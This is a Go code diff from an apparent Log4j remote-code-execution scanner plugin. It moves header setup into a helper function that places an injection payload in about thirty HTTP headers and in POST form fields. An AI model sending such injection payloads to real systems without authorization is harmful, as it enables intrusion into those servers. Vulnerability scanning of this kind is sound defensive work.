@@ -41,6 +41,38 @@ func (d *log4jRCE2) GetResult() []plugin.Plugin {
 	return result
 }
 
+func setHeaders(request *http.Request, fullPayload string) {
+	request.Header.Set("User-Agent", fullPayload)
+	request.Header.Set("X-Forwarded-For", fullPayload)
+	request.Header.Set("Client-ip", fullPayload)
+	request.Header.Set("Cookie", fullPayload)
+	request.Header.Set("Authorization", fullPayload)
+	request.Header.Set("X-Forwarded-Ssl", fullPayload)
+	request.Header.Set("X-Forwarded-For-Original", fullPayload)
+	request.Header.Set("X-Forwarded-Host", fullPayload)
+	request.Header.Set("X-Forwarded-Proto", fullPayload)
+	request.Header.Set("True-Client-IP", fullPayload)
+	request.Header.Set("DNT", fullPayload)
+	request.Header.Set("X-CSRFToken", fullPayload)
+	request.Header.Set("CSRFToken", fullPayload)
+	request.Header.Set("JWT", fullPayload)
+	request.Header.Set("X-HTTP-Method-Override", fullPayload)
+	request.Header.Set("X-Request-ID", fullPayload)
+	request.Header.Set("X-X-ProxyUser-Ip-ID", fullPayload)
+	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	request.Header.Set("X-Api-Version", fullPayload)
+	request.Header.Set("TraceID", fullPayload)
+	request.Header.Set("Content-Encoding", fullPayload)
+	request.Header.Set("Forwarded", fullPayload)
+	request.Header.Set("Sec-WebSocket-Key", fullPayload)
+	request.Header.Set("X-Client-Data", fullPayload)
+	request.Header.Set("Sec-Ch-Ua", fullPayload)
+	request.Header.Set("Sec-Ch-Ua-Mobile", fullPayload)
+	request.Header.Set("Sec-Ch-Ua-Platform", fullPayload)
+	request.Header.Set("Accept-Language", fullPayload)
+	request.Header.Set("Accept", fmt.Sprintf("text/html%s", fullPayload))
+}
+
 func (d *log4jRCE2) Check(URL string, meta plugin.TaskMeta) bool {
 	domain := util.GetHostFromUrl(URL)
 
@@ -110,7 +142,7 @@ func (d *log4jRCE2) Check(URL string, meta plugin.TaskMeta) bool {
 			for _, method := range methods {
 
 				if method == "POST" {
-					postData := fmt.Sprintf("struts.token.name=%spayload=%s&username=%s&password=%s&character_encoding=UTF-8",fullPayload, fullPayload, fullPayload, fullPayload)
+					postData := fmt.Sprintf("struts.token.name=%spayload=%s&username=%s&password=%s&character_encoding=UTF-8", fullPayload, fullPayload, fullPayload, fullPayload)
 					request, _ = http.NewRequest(method, URL+reqPath, strings.NewReader(postData))
 				} else {
 					request, _ = http.NewRequest(method, URL+reqPath, nil)
@@ -123,26 +155,7 @@ func (d *log4jRCE2) Check(URL string, meta plugin.TaskMeta) bool {
 					}
 
 					request.Header.Set(header, fullPayload)
-					request.Header.Set("User-Agent", fullPayload)
-					request.Header.Set("X-Forwarded-For", fullPayload)
-					request.Header.Set("Client-ip", fullPayload)
-					request.Header.Set("Cookie", fullPayload)
-					request.Header.Set("Authorization", fullPayload)
-					request.Header.Set("X-Forwarded-Ssl", fullPayload)
-					request.Header.Set("X-Forwarded-For-Original", fullPayload)
-					request.Header.Set("X-Forwarded-Host", fullPayload)
-					request.Header.Set("X-Forwarded-Proto", fullPayload)
-					request.Header.Set("True-Client-IP", fullPayload)
-					request.Header.Set("DNT", fullPayload)
-					request.Header.Set("X-CSRFToken", fullPayload)
-					request.Header.Set("CSRFToken", fullPayload)
-					request.Header.Set("JWT", fullPayload)
-					request.Header.Set("X-HTTP-Method-Override", fullPayload)
-					request.Header.Set("X-Request-ID", fullPayload)
-					request.Header.Set("X-X-ProxyUser-Ip-ID", fullPayload)
-					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-					request.Header.Set("X-Api-Version", fullPayload)
-					request.Header.Set("TraceID", fullPayload)
+					setHeaders(request, fullPayload)
 
 					totalCount++
 					resp, err := util.RequestDo(request, false)
@@ -177,26 +190,7 @@ func (d *log4jRCE2) Check(URL string, meta plugin.TaskMeta) bool {
 						return false
 					}
 					request.Header.Set(header, fullPayload)
-					request.Header.Set("User-Agent", fullPayload)
-					request.Header.Set("X-Forwarded-For", fullPayload)
-					request.Header.Set("Client-ip", fullPayload)
-					request.Header.Set("Cookie", fullPayload)
-					request.Header.Set("Authorization", fullPayload)
-					request.Header.Set("X-Forwarded-Ssl", fullPayload)
-					request.Header.Set("X-Forwarded-For-Original", fullPayload)
-					request.Header.Set("X-Forwarded-Host", fullPayload)
-					request.Header.Set("X-Forwarded-Proto", fullPayload)
-					request.Header.Set("True-Client-IP", fullPayload)
-					request.Header.Set("DNT", fullPayload)
-					request.Header.Set("X-CSRFToken", fullPayload)
-					request.Header.Set("CSRFToken", fullPayload)
-					request.Header.Set("JWT", fullPayload)
-					request.Header.Set("X-HTTP-Method-Override", fullPayload)
-					request.Header.Set("X-Request-ID", fullPayload)
-					request.Header.Set("X-X-ProxyUser-Ip-ID", fullPayload)
-					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-					request.Header.Set("X-Api-Version", fullPayload)
-					request.Header.Set("TraceID", fullPayload)
+					setHeaders(request, fullPayload)
 
 					totalCount++
 					resp, err := util.RequestDo(request, false)
